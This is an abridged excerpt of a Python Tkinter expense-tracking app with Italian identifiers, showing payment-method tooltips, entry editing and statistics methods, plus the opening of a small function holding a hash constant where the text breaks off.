...
class GestioneSpese(tk.Tk):
    ...
    def _metodo_pagamento_pulito(self, valore_combo):
        ...
        return parti[1].strip() if len(parti) > 1 else valore_combo.strip()
    ...
    def _bind_tooltip_metodo(self, tree, col_desc=2):
        ...
        _simbolo_di_nome = {}
        for _sim, _nome in _simboli_tooltip.items():
            _simbolo_di_nome.setdefault(_nome, _sim)
        _tt = [None]
        _after = [None]
        _item_cur = [None]
        ...
        def _mostra(event):
            ...
            _metodo_pulito = _lookup.get(item, "") if _lookup else ""
            if _metodo_pulito:
    ...
    def salva_modifica(self):
        ...
        _metodo_sel = self._metodo_pagamento_pulito(self.metodo_pagamento_var.get()) if hasattr(self, 'metodo_pagamento_var') else ""
        _metodo_nuovo = _metodo_sel or campo(voce_old, "metodo_pagamento", "")
        voce_new = SpesaEntry(
            cat, desc, imp, tipo,
    ...
    def update_spese_mese_corrente(self, year=None, month=None):
        ...
        for d, cat, desc, imp, tipo, entry in spese_mese:
            ...
            self.spese_mese_tree._metodo_lookup[item_id] = campo(entry, "metodo_pagamento", "")
    ...
    def draw_estratto_metodo(self):
        ...
        totali = {}
        dettagli = {}
        _nome_a_simbolo = {nome: simbolo for simbolo, nome in _simboli_metodo.items()}
    ...
    def update_stats(self):
        ...
        if mode == "giorno":
            ...
            for idx, entry in enumerate(spese):
                ...
                self.stats_table._metodo_lookup[_item_st] = campo(entry, "metodo_pagamento", "")
                if tipo == "Entrata":
                    tot_entrate += imp
                else:
                    tot_uscite += imp
    ...
    def salva_modifica_voce(self, params):
        ...
        nuova_voce = SpesaEntry(
            ...
            metodo_pagamento=campo(originale, "metodo_pagamento", ""),
...
def _rc():
    try:
        E_H_B = "2814b7034f1c72651cfbc6d707bc120a2b0baf7bc9bc1665a648b350d5ceeeac"
